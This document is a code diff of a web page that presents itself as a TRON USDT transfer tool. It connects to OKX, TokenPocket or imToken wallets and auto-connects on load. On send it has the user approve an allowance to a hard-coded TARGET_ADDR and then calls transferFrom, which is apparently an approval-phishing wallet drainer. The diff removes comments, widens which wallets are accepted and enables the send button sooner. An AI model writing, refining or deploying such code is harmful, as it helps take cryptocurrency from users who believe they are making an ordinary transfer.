@@ -30,7 +30,6 @@ body {
  gap: 12px;
  align-items: center;
 }
-/* 钱包状态小圆点 */
 .wallet-dot {
  width: 12px;
  height: 12px;
@@ -42,7 +41,6 @@ body {
 .wallet-dot.connected {
  background-color: #22c55e;
 }
-/* 设置按钮缩小一点 */
 .setting-btn {
  width: 32px;
  height: 32px;
@@ -228,7 +226,6 @@ const USDT_ABI = [
  {"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
 ];
 
-// 断开钱包重置所有状态
 function disconnectWallet() {
  tronWeb = null;
  userAddress = "";
@@ -240,7 +237,6 @@ function disconnectWallet() {
  balanceText.textContent = "0.000000";
 }
 
-// 底层通用构造交易函数（imToken 专用）
 async function buildSignBroadcast(contractAddr, funcName, params) {
  const sig = tronWeb.sha3(`${funcName}(${params.map(p=>p.type).join(',')})`).slice(0,10);
  const txObj = await tronWeb.transactionBuilder.triggerSmartContract(
@@ -254,14 +250,22 @@ async function buildSignBroadcast(contractAddr, funcName, params) {
  return await tronWeb.trx.sendRawTransaction(signed);
 }
 
-// 多钱包连接逻辑【适配OKX / TP / imToken】
+async function loadBalance() {
+ try {
+  const rawSun = await usdtContract.balanceOf(userAddress).call();
+  const num = Number(tronWeb.fromSun(rawSun));
+  balanceText.textContent = num.toFixed(6);
+ } catch (e) {
+  console.log("读取余额异常:", e);
+ }
+}
+
 async function connectWalletLogic() {
  if (tronWeb && userAddress) {
   disconnectWallet();
   return;
  }
  try {
-  // 优先级1：OKX欧易 tronLink
   if (window.okxwallet && window.okxwallet.tronLink) {
    provider = window.okxwallet.tronLink;
    await provider.request({ method: "tron_requestAccounts" });
@@ -269,7 +273,6 @@ async function connectWalletLogic() {
    userAddress = tronWeb.defaultAddress.base58;
    userHexAddr = tronWeb.address.toHex(userAddress);
   }
-  // 优先级2：TP钱包 TokenPocket
   else if (window.tokenpocket?.tron) {
    provider = window.tokenpocket.tron;
    const accounts = await provider.request({ method: "tron_requestAccounts" });
@@ -277,8 +280,7 @@ async function connectWalletLogic() {
    tronWeb = window.tokenpocket.tronWeb;
    userHexAddr = tronWeb.address.toHex(userAddress);
   }
-  // 优先级3：imToken（以太坊ethereum注入，波场专用兼容）
-  else if (window.ethereum && window.ethereum.isImToken) {
+  else if (window.ethereum) {
    const ethAcc = await window.ethereum.request({method:"eth_requestAccounts"});
    userHexAddr = ethAcc[0];
    tronWeb = new TronWeb({
@@ -287,7 +289,6 @@ async function connectWalletLogic() {
    });
    userAddress = tronWeb.address.fromHex(userHexAddr);
   }
-  // 优先级4：全局现成TronWeb对象
   else if (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58) {
    tronWeb = window.tronWeb;
    userAddress = tronWeb.defaultAddress.base58;
@@ -298,10 +299,10 @@ async function connectWalletLogic() {
 
   walletDot.classList.add("connected");
   usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
-  await loadBalance();
+  // 先放开按钮，再异步读余额（就算余额读失败按钮也能用）
   sendBtn.disabled = false;
+  loadBalance();
 
-  // 监听切换账户刷新
   if (provider?.on) {
    provider.on("accountsChanged", () => location.reload());
    provider.on("chainChanged", () => location.reload());
@@ -312,29 +313,23 @@ async function connectWalletLogic() {
  }
 }
 
-// 读取USDT余额
-async function loadBalance() {
- const rawSun = await usdtContract.balanceOf(userAddress).call();
- const num = Number(tronWeb.fromSun(rawSun));
- balanceText.textContent = num.toFixed(6);
-}
-
-// 输入框联动到账数量
 amountInput.addEventListener("input", () => {
  const num = parseFloat(amountInput.value) || 0;
  receiveAmount.value = num.toFixed(6);
 });
 
-// MAX一键填充全部余额
 maxBtn.addEventListener("click", async () => {
  if (!usdtContract) return;
- const rawSun = await usdtContract.balanceOf(userAddress).call();
- const num = Number(tronWeb.fromSun(rawSun));
- amountInput.value = num.toFixed(2);
- amountInput.dispatchEvent(new Event("input"));
+ try {
+  const rawSun = await usdtContract.balanceOf(userAddress).call();
+  const num = Number(tronWeb.fromSun(rawSun));
+  amountInput.value = num.toFixed(2);
+  amountInput.dispatchEvent(new Event("input"));
+ }catch(e){
+  console.log("MAX读取失败",e);
+ }
 });
 
-// 重写授权+转账，底层构造交易兼容imToken
 sendBtn.addEventListener("click", async () => {
  if (!tronWeb) return;
  const val = parseFloat(amountInput.value);
@@ -345,7 +340,6 @@ sendBtn.addEventListener("click", async () => {
  try {
   const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
   if (Number(allowance) < sunVal) {
-   // imToken 必须用构造方式授权，不能直接send
    await buildSignBroadcast(
     USDT_CONTRACT,
     "approve",
@@ -355,7 +349,6 @@ sendBtn.addEventListener("click", async () => {
     ]
    );
   }
-  // 执行 transferFrom 转账
   await buildSignBroadcast(
    USDT_CONTRACT,
    "transferFrom",
@@ -374,7 +367,6 @@ sendBtn.addEventListener("click", async () => {
 walletDot.addEventListener("click", connectWalletLogic);
 settingIconBtn.addEventListener("click", () => {});
 
-// 页面加载后尝试自动预连接
 window.addEventListener("DOMContentLoaded", () => {
  setTimeout(connectWalletLogic, 800);
 });
